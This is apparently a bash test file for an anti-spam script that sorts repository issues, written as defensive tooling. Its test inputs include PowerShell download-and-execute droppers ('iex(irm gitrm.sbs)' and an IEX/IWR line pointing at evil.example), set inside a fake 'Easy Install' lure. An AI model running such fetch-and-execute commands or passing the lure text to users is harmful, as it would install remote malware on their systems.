#!/usr/bin/env bash
# Classification tests for anti-spam-sweep.sh (no network access needed).
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=anti-spam-sweep.sh
source "$SCRIPT_DIR/anti-spam-sweep.sh" >/dev/null 2>&1

pass=0
fail=0

assert_class() {
  local expected="$1" label="$2" title="$3" body="$4"
  local actual
  actual="$(classify_issue "$title" "$body")"
  if [[ "$actual" == "$expected" ]]; then
    pass=$((pass + 1))
    printf 'ok   %s\n' "$label"
  else
    fail=$((fail + 1))
    printf 'FAIL %s: expected %q, got %q\n' "$label" "$expected" "$actual"
  fi
}

assert_class hard "dropper payload lowercase" \
  "✅ [Easy Install] PanWatch — Latest Stable Release 2026" \
  '"PanWatchInstall";iex(irm gitrm.sbs)'

assert_class hard "dropper payload with spaces" \
  "some title" \
  'run IEX (IWR https://evil.example/x.ps1) as admin'

assert_class hard "domain marker only" \
  "question about install" \
  'is gitrm.sbs the official installer?'

assert_class title "campaign title template, benign body" \
  "✅ [Easy Install] PanWatch — Latest Stable Release 2026" \
  "One command installs everything."

assert_class "" "plain 'easy install' without brackets is not spam" \
  "Is there an easy install method?" \
  "Docker compose failed on my machine, here are the logs."

assert_class "" "legit Chinese bug report" \
  "升级之后一直创建备份报错是什么问题呢" \
  "升级到最新版本后，创建备份一直报错，日志如下。"

assert_class "" "legit feature request mentioning docker" \
  "feat 提案: AU (ASX) 市场支持" \
  "希望支持澳洲市场，另外 Docker 镜像能否精简。"

assert_class "" "body mentions irm alone" \
  "network question" \
  "irm returns 403 behind our proxy, how to configure?"

printf '\n%d passed, %d failed\n' "$pass" "$fail"
[[ "$fail" -eq 0 ]]
